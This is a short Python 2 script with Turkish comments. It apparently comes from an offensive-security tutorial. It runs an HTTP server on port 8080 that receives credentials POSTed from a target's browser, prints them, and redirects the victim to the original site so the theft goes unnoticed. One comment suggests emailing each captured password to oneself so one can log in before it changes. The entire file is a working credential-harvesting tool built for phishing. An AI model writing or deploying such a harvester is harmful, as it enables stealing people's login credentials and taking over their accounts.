import SimpleHTTPServer
import SocketServer
import urllib

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])# sunucumuz hedefin tarayicisindan bir talep aldiginda talebin boyutunu belirlemek icin content-lenght boyutunu okuruz.
        creds = self.rfile.read(content_length).decode('utf-8')#istegin icerigi okunur ve yazdirilir
        print creds
        site = self.path[1:]
        self.send_response(301) # ardinddan kynak siteyi ayristirir ve hedef tarayiciyi hedef sitenin ana sayfasina yendien yonlendirmeye zorlariz. buraya eklenecek ek bir ozellik kimlik bilgisi her alindiginda kendinize bir e-posta gondermek olabilir , boylece sifreler degismeden oturum acarsin 
        self.send_header('Location',urllib.unquote(site))
        self.end_headers()

server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler) # temel tcpserver sinifini http post istekleirnin islenmesinden sorumlu olacak ip, port,ve credrequesthandler sinifi ile baslatiyoruz.
server.serve_forever()

#http sunucumuzdur.